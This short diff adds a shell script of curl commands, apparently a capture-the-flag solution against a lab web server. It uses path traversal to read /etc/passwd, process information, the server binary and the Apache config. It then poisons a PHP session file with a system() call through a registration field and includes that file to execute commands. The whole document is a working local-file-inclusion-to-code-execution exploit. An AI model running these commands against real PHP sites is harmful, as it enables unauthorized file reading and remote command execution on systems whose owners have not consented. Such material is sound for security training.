@@ -1,0 +1,10 @@
+curl -k "https://edu-ctf.csie.org:10157/?action=module&m=../../../../etc/passwd"
+curl -k "https://edu-ctf.csie.org:10157/?action=module&m=../../../../proc/self/cmdline"
+curl -k "https://edu-ctf.csie.org:10157/?action=module&m=../../../../proc/self/exe" > exe
+strings exe > str
+grep "http" str
+curl -k "https://edu-ctf.csie.org:10157/?action=module&m=../../../../etc/httpd/conf/httpd.conf" > conf
+------------
+curl -k --cookie "PHPSESSID=tryit" -d "user=hi_<?php system(\"ls /| base64\");?>" "https://edu-ctf.csie.org:10157/?action=register" > .trash
+curl -k --cookie "PHPSESSID=tryit" "https://edu-ctf.csie.org:10157/?action=module&m=../../../../var/lib/php/session/sess_tryit"
+
